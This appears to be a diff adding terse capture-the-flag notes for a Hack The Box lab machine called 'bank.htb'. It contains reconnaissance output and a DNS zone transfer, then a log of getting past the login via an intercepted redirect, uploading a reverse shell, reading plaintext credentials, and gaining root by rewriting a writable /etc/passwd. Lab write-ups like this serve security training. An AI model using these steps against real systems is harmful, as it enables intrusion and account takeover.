@@ -1,0 +1,166 @@
+---NMAP---
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
+|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
+|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
+|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
+53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+---MASSCAN---
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 53/tcp on 10.10.10.29                                     
+Discovered open port 80/tcp on 10.10.10.29                                     
+Discovered open port 22/tcp on 10.10.10.29    
+
+---GOBUSTER---
+/ (common.txt):
+  /.hta (Status: 403)
+  /.hta.php (Status: 403)
+  /.hta.txt (Status: 403)
+  /.htpasswd (Status: 403)
+  /.htpasswd.php (Status: 403)
+  /.htpasswd.txt (Status: 403)
+  /.htaccess (Status: 403)
+  /.htaccess.php (Status: 403)
+  /.htaccess.txt (Status: 403)
+  /index.html (Status: 200)
+  /server-status (Status: 403)
+
+/ (big.txt):
+  /.htpasswd (Status: 403)
+  /.htpasswd.php (Status: 403)
+  /.htpasswd.txt (Status: 403)
+  /.htaccess (Status: 403)
+  /.htaccess.php (Status: 403)
+  /.htaccess.txt (Status: 403)
+  /server-status (Status: 403)
+
+bank.htb/ (common.txt):
+  /.hta (Status: 403)
+  /.hta.php (Status: 403)
+  /.hta.txt (Status: 403)
+  /.htaccess (Status: 403)
+  /.htaccess.php (Status: 403)
+  /.htaccess.txt (Status: 403)
+  /.htpasswd (Status: 403)
+  /.htpasswd.txt (Status: 403)
+  /.htpasswd.php (Status: 403)
+  /assets (Status: 301)
+  /inc (Status: 301)
+  /index.php (Status: 302)
+  /index.php (Status: 302)
+  /login.php (Status: 200)
+  /logout.php (Status: 302)
+  /server-status (Status: 403)
+  /support.php (Status: 302)
+  /uploads (Status: 301)
+
+bank.htb (big.txt):
+  /.htpasswd (Status: 403)
+  /.htpasswd.php (Status: 403)
+  /.htpasswd.txt (Status: 403)
+  /.htaccess (Status: 403)
+  /.htaccess.php (Status: 403)
+  /.htaccess.txt (Status: 403)
+  /assets (Status: 301)
+  /inc (Status: 301)
+  /index.php (Status: 302)
+  /login.php (Status: 200)
+  /logout.php (Status: 302)
+  /server-status (Status: 403)
+  /support.php (Status: 302)
+  /uploads (Status: 301)
+
+---NSLOOKUP---
+*nslookup
+> SERVER 10.10.10.29
+Default server: 10.10.10.29
+Address: 10.10.10.29#53
+> 127.0.0.1
+1.0.0.127.in-addr.arpa  name = localhost.
+> 10.10.10.29
+** server can't find 29.10.10.10.in-addr.arpa: NXDOMAIN
+> bank.htb
+Server:         10.10.10.29
+Address:        10.10.10.29#53
+
+Name:   bank.htb
+Address: 10.10.10.29
+
+---DNSRECON---
+*dnsrecon -r 127.0.0.0/24 -n 10.10.10.29
+[*] Reverse Look-up of a Range
+[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
+[+] {'type': 'PTR', 'name': 'localhost', 'address': '127.0.0.1'}
+[+] 1 Records Found
+*dnsrecon -r 10.10.10.0/24 -n 10.10.10.29
+[*] Reverse Look-up of a Range
+[*] Performing Reverse Lookup from 10.10.10.0 to 10.10.10.255
+[+] 0 Records Found
+
+---DIG---
+(guessing the machine name)
+*dig axfr bank.htb @10.10.10.29
+
+; <<>> DiG 9.16.2-Debian <<>> axfr bank.htb @10.10.10.29
+;; global options: +cmd
+bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
+bank.htb.               604800  IN      NS      ns.bank.htb.
+bank.htb.               604800  IN      A       10.10.10.29
+ns.bank.htb.            604800  IN      A       10.10.10.29
+www.bank.htb.           604800  IN      CNAME   bank.htb.
+bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
+;; Query time: 208 msec
+;; SERVER: 10.10.10.29#53(10.10.10.29)
+;; WHEN: Thu Aug 27 10:56:23 EDT 2020
+;; XFR size: 6 records (messages 1, bytes 171)
+
+
+---attempts---
+changing host for 10.10.10.29 to bank.htb (machine name)
+the bank.htb redirects to bank.htb/login.php
+intercept this redirect and show a transaction history page and balance
+intercept the support.php and found upload images form
+uploaded a reverse shell
+*whoami www-data
+cat /home/chris/user.txt
+
+---privesc---
+*sudo -v
+Sorry, user www-data may not run sudo on bank.
+
+found bankreports.txt in /var/www/bank
+*cat bankreports.txt
++=================+
+| HTB Bank Report |
++=================+
+
+===Users===
+Full Name: Christos Christopoulos
+Email: chris@bank.htb
+Password: !##HTBB4nkP4ssw0rd!##
+CreditCards: 2
+Transactions: 8
+Balance: 1.337$
+found user.php in /var/ww/bank/inc
+*cat user.php
+$mysql = new mysqli("localhost", "root", "!@#S3cur3P4ssw0rd!@#", "htbbank");
+nothing achieved in mysql
+
+uploaded linpeas with  http
+*./linpeas.sh
+/etc/passwd is a writable file
+changing the root password to james
+*openssl passwd james
+BTJ6A9x77KVWY
+writing to root:PASS:...
+KUDOS
+*cat /root/root.txt
